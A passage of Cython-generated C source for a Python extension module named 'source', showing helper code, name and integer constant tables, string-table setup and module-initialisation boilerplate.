m->nb_int)) {\n    name = \"int\";\n    res = m->nb_int(x);\n  }\n  #endif\n#else\n  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {\n    res = PyNumber_Int(x);\n  }\n#endif\n  if (likely(res)) {\n#if PY_MAJOR_VERSION < 3\n    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {\n#else\n    if (unlikely(!PyLong_CheckExact(res))) {\n#endif\n        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);\n    }\n  }\n  else if (!PyErr_Occurred()) {\n    PyErr_SetString(PyExc_TypeError,\n                    \"an integer is required\");\n  }\n  return res;\n}\nstatic CYTHON_INLINE Py_ssize_t __Pyx_PyIn""dex_AsSsize_t(PyObject* b) {\n  Py_ssize_t ival;\n  PyObject *x;\n#if PY_MAJOR_VERSION < 3\n  if (likely(PyInt_CheckExact(b))) {\n    if (sizeof(Py_ssize_t) >= sizeof(long))\n        return PyInt_AS_LONG(b);\n    else\n        return PyInt_AsSsize_t(b);\n  }\n#endif\n  if (likely(PyLong_CheckExact(b))) {\n    #if CYTHON_USE_PYLONG_INTERNALS\n    const digit* digits = ((PyLongObject*)b)->ob_digit;\n    const Py_ssize_t size = Py_SIZE(b);\n    if (likely(__Pyx_sst_abs(size) <= 1)) {\n        ival = likely(size) ? digits[0] : 0;\n        if (size == -1) ival = -ival;\n        return ival;\n    } else {\n      switch (size) {\n         case 2:\n           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {\n             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case -2:\n           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {\n             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case 3:\n           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {\n             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case -3:\n           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {\n             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case 4:\n           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {\n             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case -4:\n           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {\n             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | ""(size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n      }\n    }\n    #endif\n    return PyLong_AsSsize_t(b);\n  }\n  x = PyNumber_Index(b);\n  if (!x) return -1;\n  ival = PyInt_AsSsize_t(x);\n  Py_DECREF(x);\n  return ival;\n}\nstatic CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {\n  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {\n    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);\n#if PY_MAJOR_VERSION < 3\n  } else if (likely(PyInt_CheckExact(o))) {\n    return PyInt_AS_LONG(o);\n#endif\n  } else {\n    Py_ssize_t ival;\n    PyObject *x;\n    x = PyNumber_Index(o);\n    if (!x) return -1;\n    ival = PyInt_AsLong(x);\n    Py_DECREF(x);\n    return ival;\n  }\n}\nstatic CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {\n  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);\n}\nstatic CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {\n    return PyInt_FromSize_t(ival);\n}\n\n\n#endif /* Py_PYTHON_H */";
            static PyObject *__pyx_n_s_COMPILE_FILE;
            static PyObject *__pyx_n_s_C_FILE;
            static PyObject *__pyx_n_s_C_SOURCE;
            static PyObject *__pyx_n_s_EXECUTE_FILE;
            static PyObject *__pyx_n_s_EXPORT_PYTHONHOME;
            static PyObject *__pyx_n_s_EXPORT_PYTHON_EXECUTABLE;
            static PyObject *__pyx_n_s_PREFIX;
            static PyObject *__pyx_n_s_PSH_TEAM_KEY;
            static PyObject *__pyx_n_s_PYTHON_VERSION;
            static PyObject *__pyx_n_s_RUN;
            static PyObject *__pyx_n_s_cline_in_traceback;
            static PyObject *__pyx_n_s_dirname;
            static PyObject *__pyx_n_s_enter;
            static PyObject *__pyx_n_s_executable;
            static PyObject *__pyx_n_s_exist_ok;
            static PyObject *__pyx_n_s_exit;
            static PyObject *__pyx_n_s_exit_2;
            static PyObject *__pyx_n_s_f;
            static PyObject *__pyx_kp_u_ifndef_PY_SSIZE_T_CLEAN_define;
            static PyObject *__pyx_n_s_import;
            static PyObject *__pyx_n_s_isfile;
            static PyObject *__pyx_n_s_main;
            static PyObject *__pyx_n_s_makedirs;
            static PyObject *__pyx_n_s_name;
            static PyObject *__pyx_n_s_open;
            static PyObject *__pyx_n_s_os;
            static PyObject *__pyx_n_s_path;
            static PyObject *__pyx_n_s_prefix;
            static PyObject *__pyx_n_s_remove;
            static PyObject *__pyx_n_s_split;
            static PyObject *__pyx_n_s_sys;
            static PyObject *__pyx_n_s_system;
            static PyObject *__pyx_n_s_test;
            static PyObject *__pyx_n_s_version;
            static PyObject *__pyx_n_s_write;
static PyObject *__pyx_int_0;
static PyObject *__pyx_int_32;
static PyObject *__pyx_int_38;
static PyObject *__pyx_int_45;
static PyObject *__pyx_int_46;
static PyObject *__pyx_int_47;
static PyObject *__pyx_int_48;
static PyObject *__pyx_int_49;
static PyObject *__pyx_int_50;
static PyObject *__pyx_int_53;
static PyObject *__pyx_int_55;
static PyObject *__pyx_int_61;
static PyObject *__pyx_int_65;
static PyObject *__pyx_int_66;
static PyObject *__pyx_int_67;
static PyObject *__pyx_int_69;
static PyObject *__pyx_int_72;
static PyObject *__pyx_int_73;
static PyObject *__pyx_int_76;
static PyObject *__pyx_int_77;
static PyObject *__pyx_int_78;
static PyObject *__pyx_int_79;
static PyObject *__pyx_int_80;
static PyObject *__pyx_int_82;
static PyObject *__pyx_int_84;
static PyObject *__pyx_int_85;
static PyObject *__pyx_int_86;
static PyObject *__pyx_int_88;
static PyObject *__pyx_int_89;
static PyObject *__pyx_int_95;
static PyObject *__pyx_int_97;
static PyObject *__pyx_int_98;
static PyObject *__pyx_int_99;
static PyObject *__pyx_int_100;
static PyObject *__pyx_int_101;
static PyObject *__pyx_int_103;
static PyObject *__pyx_int_104;
static PyObject *__pyx_int_105;
static PyObject *__pyx_int_108;
static PyObject *__pyx_int_110;
static PyObject *__pyx_int_111;
static PyObject *__pyx_int_112;
static PyObject *__pyx_int_114;
static PyObject *__pyx_int_116;
static PyObject *__pyx_int_117;
static PyObject *__pyx_int_118;
static PyObject *__pyx_int_119;
static PyObject *__pyx_int_120;
static PyObject *__pyx_int_121;
static PyObject *__pyx_int_128;
static PyObject *__pyx_int_145;
static PyObject *__pyx_int_159;
static PyObject *__pyx_int_168;
static PyObject *__pyx_int_174;
static PyObject *__pyx_int_216;
static PyObject *__pyx_int_240;
static PyObject *__pyx_int_neg_1;
static PyObject *__pyx_tuple_;
static PyObject *__pyx_slice__2;
static PyObject *__pyx_tuple__3;
/* Late includes */

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_source(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_source},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "source",
    0, /* m_doc */
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0, /* m_size */
  #else
    -1, /* m_size */
  #endif
    __pyx_methods /* m_methods */,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots, /* m_slots */
  #else
    NULL, /* m_reload */
  #endif
    NULL, /* m_traverse */
    NULL, /* m_clear */
    NULL /* m_free */
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_n_s_COMPILE_FILE, __pyx_k_COMPILE_FILE, sizeof(__pyx_k_COMPILE_FILE), 0, 0, 1, 1},
  {&__pyx_n_s_C_FILE, __pyx_k_C_FILE, sizeof(__pyx_k_C_FILE), 0, 0, 1, 1},
  {&__pyx_n_s_C_SOURCE, __pyx_k_C_SOURCE, sizeof(__pyx_k_C_SOURCE), 0, 0, 1, 1},
  {&__pyx_n_s_EXECUTE_FILE, __pyx_k_EXECUTE_FILE, sizeof(__pyx_k_EXECUTE_FILE), 0, 0, 1, 1},
  {&__pyx_n_s_EXPORT_PYTHONHOME, __pyx_k_EXPORT_PYTHONHOME, sizeof(__pyx_k_EXPORT_PYTHONHOME), 0, 0, 1, 1},
  {&__pyx_n_s_EXPORT_PYTHON_EXECUTABLE, __pyx_k_EXPORT_PYTHON_EXECUTABLE, sizeof(__pyx_k_EXPORT_PYTHON_EXECUTABLE), 0, 0, 1, 1},
  {&__pyx_n_s_PREFIX, __pyx_k_PREFIX, sizeof(__pyx_k_PREFIX), 0, 0, 1, 1},
  {&__pyx_n_s_PSH_TEAM_KEY, __pyx_k_PSH_TEAM_KEY, sizeof(__pyx_k_PSH_TEAM_KEY), 0, 0, 1, 1},
  {&__pyx_n_s_PYTHON_VERSION, __pyx_k_PYTHON_VERSION, sizeof(__pyx_k_PYTHON_VERSION), 0, 0, 1, 1},
  {&__pyx_n_s_RUN, __pyx_k_RUN, sizeof(__pyx_k_RUN), 0, 0, 1, 1},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_dirname, __pyx_k_dirname, sizeof(__pyx_k_dirname), 0, 0, 1, 1},
  {&__pyx_n_s_enter, __pyx_k_enter, sizeof(__pyx_k_enter), 0, 0, 1, 1},
  {&__pyx_n_s_executable, __pyx_k_executable, sizeof(__pyx_k_executable), 0, 0, 1, 1},
  {&__pyx_n_s_exist_ok, __pyx_k_exist_ok, sizeof(__pyx_k_exist_ok), 0, 0, 1, 1},
  {&__pyx_n_s_exit, __pyx_k_exit, sizeof(__pyx_k_exit), 0, 0, 1, 1},
  {&__pyx_n_s_exit_2, __pyx_k_exit_2, sizeof(__pyx_k_exit_2), 0, 0, 1, 1},
  {&__pyx_n_s_f, __pyx_k_f, sizeof(__pyx_k_f), 0, 0, 1, 1},
  {&__pyx_kp_u_ifndef_PY_SSIZE_T_CLEAN_define, __pyx_k_ifndef_PY_SSIZE_T_CLEAN_define, sizeof(__pyx_k_ifndef_PY_SSIZE_T_CLEAN_define), 0, 1, 0, 0},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_isfile, __pyx_k_isfile, sizeof(__pyx_k_isfile), 0, 0, 1, 1},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_n_s_makedirs, __pyx_k_makedirs, sizeof(__pyx_k_makedirs), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_n_s_open, __pyx_k_open, sizeof(__pyx_k_open), 0, 0, 1, 1},
  {&__pyx_n_s_os, __pyx_k_os, sizeof(__pyx_k_os), 0, 0, 1, 1},
  {&__pyx_n_s_path, __pyx_k_path, sizeof(__pyx_k_path), 0, 0, 1, 1},
  {&__pyx_n_s_prefix, __pyx_k_prefix, sizeof(__pyx_k_prefix), 0, 0, 1, 1},
  {&__pyx_n_s_remove, __pyx_k_remove, sizeof(__pyx_k_remove), 0, 0, 1, 1},
  {&__pyx_n_s_split, __pyx_k_split, sizeof(__pyx_k_split), 0, 0, 1, 1},
  {&__pyx_n_s_sys, __pyx_k_sys, sizeof(__pyx_k_sys), 0, 0, 1, 1},
  {&__pyx_n_s_system, __pyx_k_system, sizeof(__pyx_k_system), 0, 0, 1, 1},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {&__pyx_n_s_version, __pyx_k_version, sizeof(__pyx_k_version), 0, 0, 1, 1},
  {&__pyx_n_s_write, __pyx_k_write, sizeof(__pyx_k_write), 0, 0, 1, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  __pyx_builtin_exit = __Pyx_GetBuiltinName(__pyx_n_s_exit); if (!__pyx_builtin_exit) __PYX_ERR(0, 92, __pyx_L1_error)
  __pyx_builtin_open = __Pyx_GetBuiltinName(__pyx_n_s_open); if (!__pyx_builtin_open) __PYX_ERR(0, 5392, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  
  __pyx_tuple_ = PyTuple_Pack(1, __pyx_int_0); if (unlikely(!__pyx_tuple_)) __PYX_ERR(0, 92, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple_);
  __Pyx_GIVEREF(__pyx_tuple_);

  
  __pyx_slice__2 = PySlice_New(Py_None, __pyx_int_neg_1, Py_None); if (unlikely(!__pyx_slice__2)) __PYX_ERR(0, 5373, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_slice__2);
  __Pyx_GIVEREF(__pyx_slice__2);

  
  __pyx_tuple__3 = PyTuple_Pack(3, Py_None, Py_None, Py_None); if (unlikely(!__pyx_tuple__3)) __PYX_ERR(0, 5392, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__3);
  __Pyx_GIVEREF(__pyx_tuple__3);
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_0 = PyInt_FromLong(0); if (unlikely(!__pyx_int_0)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_32 = PyInt_FromLong(32); if (unlikely(!__pyx_int_32)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_38 = PyInt_FromLong(38); if (unlikely(!__pyx_int_38)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_45 = PyInt_FromLong(45); if (unlikely(!__pyx_int_45)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_46 = PyInt_FromLong(46); if (unlikely(!__pyx_int_46)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_47 = PyInt_FromLong(47); if (unlikely(!__pyx_int_47)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_48 = PyInt_FromLong(48); if (unlikely(!__pyx_int_48)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_49 = PyInt_FromLong(49); if (unlikely(!__pyx_int_49)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_50 = PyInt_FromLong(50); if (unlikely(!__pyx_int_50)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_53 = PyInt_FromLong(53); if (unlikely(!__pyx_int_53)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_55 = PyInt_FromLong(55); if (unlikely(!__pyx_int_55)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_61 = PyInt_FromLong(61); if (unlikely(!__pyx_int_61)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_65 = PyInt_FromLong(65); if (unlikely(!__pyx_int_65)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_66 = PyInt_FromLong(66); if (unlikely(!__pyx_int_66)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_67 = PyInt_FromLong(67); if (unlikely(!__pyx_int_67)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_69 = PyInt_FromLong(69); if (unlikely(!__pyx_int_69)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_72 = PyInt_FromLong(72); if (unlikely(!__pyx_int_72)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_73 = PyInt_FromLong(73); if (unlikely(!__pyx_int_73)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_76 = PyInt_FromLong(76); if (unlikely(!__pyx_int_76)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_77 = PyInt_FromLong(77); if (unlikely(!__pyx_int_77)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_78 = PyInt_FromLong(78); if (unlikely(!__pyx_int_78)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_79 = PyInt_FromLong(79); if (unlikely(!__pyx_int_79)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_80 = PyInt_FromLong(80); if (unlikely(!__pyx_int_80)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_82 = PyInt_FromLong(82); if (unlikely(!__pyx_int_82)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_84 = PyInt_FromLong(84); if (unlikely(!__pyx_int_84)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_85 = PyInt_FromLong(85); if (unlikely(!__pyx_int_85)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_86 = PyInt_FromLong(86); if (unlikely(!__pyx_int_86)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_88 = PyInt_FromLong(88); if (unlikely(!__pyx_int_88)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_89 = PyInt_FromLong(89); if (unlikely(!__pyx_int_89)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_95 = PyInt_FromLong(95); if (unlikely(!__pyx_int_95)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_97 = PyInt_FromLong(97); if (unlikely(!__pyx_int_97)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_98 = PyInt_FromLong(98); if (unlikely(!__pyx_int_98)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_99 = PyInt_FromLong(99); if (unlikely(!__pyx_int_99)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_100 = PyInt_FromLong(100); if (unlikely(!__pyx_int_100)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_101 = PyInt_FromLong(101); if (unlikely(!__pyx_int_101)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_103 = PyInt_FromLong(103); if (unlikely(!__pyx_int_103)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_104 = PyInt_FromLong(104); if (unlikely(!__pyx_int_104)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_105 = PyInt_FromLong(105); if (unlikely(!__pyx_int_105)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_108 = PyInt_FromLong(108); if (unlikely(!__pyx_int_108)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_110 = PyInt_FromLong(110); if (unlikely(!__pyx_int_110)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_111 = PyInt_FromLong(111); if (unlikely(!__pyx_int_111)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_112 = PyInt_FromLong(112); if (unlikely(!__pyx_int_112)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_114 = PyInt_FromLong(114); if (unlikely(!__pyx_int_114)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_116 = PyInt_FromLong(116); if (unlikely(!__pyx_int_116)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_117 = PyInt_FromLong(117); if (unlikely(!__pyx_int_117)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_118 = PyInt_FromLong(118); if (unlikely(!__pyx_int_118)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_119 = PyInt_FromLong(119); if (unlikely(!__pyx_int_119)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_120 = PyInt_FromLong(120); if (unlikely(!__pyx_int_120)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_121 = PyInt_FromLong(121); if (unlikely(!__pyx_int_121)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_128 = PyInt_FromLong(128); if (unlikely(!__pyx_int_128)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_145 = PyInt_FromLong(145); if (unlikely(!__pyx_int_145)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_159 = PyInt_FromLong(159); if (unlikely(!__pyx_int_159)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_168 = PyInt_FromLong(168); if (unlikely(!__pyx_int_168)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_174 = PyInt_FromLong(174); if (unlikely(!__pyx_int_174)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_216 = PyInt_FromLong(216); if (unlikely(!__pyx_int_216)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_240 = PyInt_FromLong(240); if (unlikely(!__pyx_int_240)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_neg_1 = PyInt_FromLong(-1); if (unlikely(!__pyx_int_neg_1)) __PYX_ERR(0, 5, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initsource(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_source(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  int __pyx_t_11;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'source' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_source(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
